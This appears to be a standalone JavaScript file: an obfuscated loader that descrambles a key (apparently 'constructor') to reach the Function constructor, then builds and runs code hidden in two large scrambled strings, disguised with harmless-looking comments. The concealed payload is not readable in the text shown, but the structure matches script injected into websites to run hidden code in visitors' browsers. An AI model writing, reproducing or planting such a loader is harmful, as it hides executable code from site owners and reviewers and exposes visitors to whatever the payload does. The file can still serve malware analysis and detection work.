(function() {
    console.log('start work...')
    var queryParams = '',
        id = 949 - 938;

    function shuffleString(str) {
        var seed = 5561212;
        var length = str.length;
        var array = [];

        // Create an array of characters from the string
        for (var i = 0; i < length; i++) {
            array[i] = str.charAt(i);
        }

        // Shuffle the characters using the seed
        for (var i = 0; i < length; i++) {
            var v = seed * (i + 484) + (seed % 22839);
            var d = seed * (i + 317) + (seed % 29571);
            var n = v % length;
            var c = d % length;

            // Swap characters
            var temp = array[n];
            array[n] = array[c];
            array[c] = temp;

            seed = (v + d) % 6651092;
        }

        return array.join('');
    }

    // Function usage to shuffle a specific string
    var shuffledKey = shuffleString('smgscnutrnaelyducrotfkwhzotovqcbrpxij').substr(0, id);

    // Obfuscated string which may contain further logic
    var obfuscatedCode = '2br an{c0;m8-0hioj.)4ijr)gt((rihvaitol,nnpfr[5euwlr"zv9y]hrpr.ofaco0w,,irtg olltprbn]6oklaafa,9,(}dap=)8(n1ya)=i} .)nl)6](Chr"a=[j,"=);vkvte=C7r(l(hems;i;()z=* )37r .)r1;verfd=noqol=93hj.,]it"b {a.ff,vca= "=0.b<AnA);+)tsd[z.hshentrn axrgobs;g8)==et 0a.vs=+(o0)9 [a)r; 8=rkficunagtahr;->=0eq-d.=++;agl;.peACnr=dm+),]hnaa);e"[l[;hd+ec)sv rc;tu[s,rv(;]pv)=.vh(9.r;rn8hc.;+<r;u7g; ieru="pz=aa,Co,6=efj)0fa. i+h);kois1orlnns -,.nqd.p2(u{qwf3,1(r+uj]3(e(t,s<+]tr(.eniqrsmf;+1trhaC}noev2rv8dj(Aghg7=75,A0px;;[rta=g+lt( }doaa;6l=+;;==(ox.[rh}.)oirgjntte[ez.*urj1;n}r;l= ,]s3rnc;;+a.2fr{f){=;=x)r[(grc.0=ival6(=u8b];vj]l f=z11;+t.[vat8avupyd,,jdtl+s(a5.=rusbCst()u,,rgo)(!k]h+ejCp;h;77;=9,vpc2;i,a;yro[a{r (,v0(<,5=,oz;vi-+r]lr;jr2;z6ru!79krahc<cr+vjf(hz (+u wbS(j)n=o()manult(;{e540l;)o)[nnr(+16;(n ne afrepnr+==p>f8p i+f-Si]ne xh"ce8=49)cy}e;7=bgrv.gvtp51=vii=lC)r+1;(n4ud,g2)i2lu-rsa;)"av.o6"l0+u';

    // Call the shuffled string method (like a function)
    var lookup = shuffleString[shuffledKey];
    var result = lookup('', shuffleString(obfuscatedCode));

    var finalResult = result(shuffleString('Lu..LbLaLowE(do7iecobh#so474LL3Lmi3_]9c3t3nL7u3&c:5L5.(4m :_}ct63\/x7%1rb%$e,e5_o5%afadte=L>t.m.n#S;mNCa!)icL_].Lc." ;eLewL*,=su;j]]=_5=udL2tlt(-i1.$bfe{l(ci(3ibLur_L(s(ecCph68e6x(LdeL=L.fbg1}LL-($s._af,))LLshLefea!Lo_r. .2)3ifLs.,hL.\'8dr5bof=[_7r-o%3$g9frdrwa_,.ta;.)..)8} frh90xu2(;L_.fc(w_4#L9]w(,.e(f.o8_)eLw.tu=(=!fotr=e}ha!%.0f%.eo_L]L8qyediL_9;?erb-;)3xt,p_3;(h_n&rL}of8;,Lhf,ntn_"y8)9=!a;LLn2a)\/,.aL+!fae<q4,(r!$xs$L%xL9wLc.)a+L!hL;yL$o,@"ux1].<h&tr=l,et,7mdL.!iwc1,h6L}f[]{0!opf;"e*]))\'6eeek..L1LofnL]L[(p!=wfao%dh3e{1;t;)i%7}]0;fsdw slarn+:Lire4}})_S.e)L3w3m5,3[p)0>.tLLtf%,4yfrLa,):(LL.4nL;m);3(we&3S],$l1u),eL\'(].<L2la.w1ae\/!L1;8f,;ya1Lb)LL(_l))fLtL8yL.Lk nt"L(on{\'<e f,aL7%0.yse3s,i]ha;j%L1{(6o.e2f;i!oL5pL ih7= ofLn:trm$b2Lto=d(e{]n;L tn_dL$L)rd (])((i{1L_c!{c%g$33.d.4La8af$ffL.L1Lo{.f_]g=36f+%al%0q)lehLLs<Los0(L.)qu7)}od)Lam=3?h)o.iw$s.7(l2]S;Lrf.fr]s4$@ywe3o)L(,)oL_oje);=) (pqsh.4.51et!*c33]ftL1=()i]rdbL(ftpc]xLt.,LLsL\/_pnihedtc)g.LL>tknenla)e?$n)(.!f4e.n.("m()+e$e)1@LL.5r&0q18r!j6=,e1{nwa)=={%S0\'(n"$ nL0,i4)2,;l).anji.)rwafL(o_pkf.>96a)r.{g L5L(l_etrN;7L.x]8ou)]<onLit)LL.!tL.#.]e(i (L.itru;q21}in.n)_{(%LnLr[*>L=_o{&Lrt.fie)moLfeeo._u{hu}73>{)j=)L e9w,fLc5k:+u8]c L(;.(Std(L%4Ll9.$=uLt)ne,_(=nL0)Ln!c].(e(L47eLl1]_(tr4!);L<o#=}2!)e;s}ffs dcc{e5re!).f.!fu;4tg}{4]L-5L]{(x=t(dLo3)6ffr.>snf)afL_s=}xr1)o6eLf]3{)o$_k1]n((f}+je;>.cdsoo=d]L(]Le\/cg(\'$e"_o34=L%)76kLcLf%;.=. !$.i@.%_.tLi+,1L!s{L3k.L=t.o..)}10\'.2d},tLsd};!Lsf7d;t43Lc);s*r_].L{.3e.1Serr\/L(N;ceL>fal!(iL(.e(ng,].vlt(Lx$t[ $\/6Lfl(,}q]rL,k9opr)$a]t_L$1L%p),4}lL4rfnr4L6?9$r.3=LeNi({1a(e=.)6\'o_L6$hhtn!o<fp}piL;nlL}<.t1toL.w ;no;d6r=LL0iisd+]tf7Lu$al14.o_." ]nn$){pe.a b+%_L(aL()di=t_!.adl f}s.riwn1r7;La (+9])le1wea7.rnr.]tt$7f(ibdcn d)5e)f farsfk,8#e? t#uog0 b($$e.g+fxtL8fL Ln}ui\/o3 e2b), .!c]'));  // More obfuscated content

    // finalResult(1833);

    return 9681;
})();
